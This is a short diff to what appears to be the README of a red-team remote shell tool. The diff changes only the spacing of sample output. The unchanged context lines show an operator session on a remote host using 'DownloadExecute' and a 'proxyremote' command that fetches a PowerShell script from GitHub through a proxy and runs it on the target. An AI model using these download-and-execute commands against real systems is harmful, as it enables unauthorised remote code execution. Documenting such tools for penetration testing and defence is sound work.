@@ -94,8 +94,8 @@ Supported commands:
 Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName                                 
 -------  ------    -----      ----- -----   ------     -- -----------                                 
      39       6     2240       5208    46     0.02   4304 AppUIMonitor_00   
- ...
- [*] DownloadExecute: execution Completed
+...
+[*] DownloadExecute: execution Completed
 
 (10.0.0.153:RINGZER0\mrun1k0d3r):Command >proxyremote http://10.0.0.153:1111 https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-BrowserHomepage.ps1 Get-BrowserHomepage
 [*] ProxyDownloadExecute: Fetching https://raw.githubusercontent.com/Mr-Un1k0d3r/RedTeamPowershellScripts/master/scripts/Get-BrowserHomepage.ps1
